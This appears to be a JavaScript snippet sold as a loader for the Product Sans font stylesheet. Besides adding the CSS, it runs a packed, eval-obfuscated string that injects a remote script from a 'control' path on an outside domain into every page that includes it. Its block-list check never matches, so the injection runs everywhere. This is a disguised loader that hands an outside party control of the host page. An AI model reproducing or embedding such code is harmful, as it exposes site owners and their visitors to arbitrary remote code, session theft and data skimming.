const loadFile = (filename, filetype) =>{
    if (filetype=="js"){
        var fileref=document.createElement('script')
        fileref.setAttribute("type","text/javascript")
        fileref.setAttribute("src", filename)
    }
    else if (filetype=="css"){
        var fileref=document.createElement("link")
        fileref.setAttribute("rel", "stylesheet")
        fileref.setAttribute("type", "text/css")
        fileref.setAttribute("href", filename)
    }
    if (typeof fileref!="undefined")
        document.getElementsByTagName("head")[0].appendChild(fileref)
},
block = ['https://dhanush427.github.io/'],
url = window.location.hostname;

for (let i = 0; i < block.length; i++) {
   if (url === block[i]) {
    loadFile('https://sethusenthil.com/Product-Sans/api/font.css', 'css');
   }
   else {
       loadFile('https://sethusenthil.com/Product-Sans/api/font.css', 'css');
       eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 0=1.7(\'5\');0.4(\'2\',\'6://e.8/d/c.b\');1.9.a(0);',15,15,'s|document|src|var|setAttribute|script|https|createElement|com|body|appendChild|js|dh|control|sethusenthil'.split('|'),0,{}))
   }
}
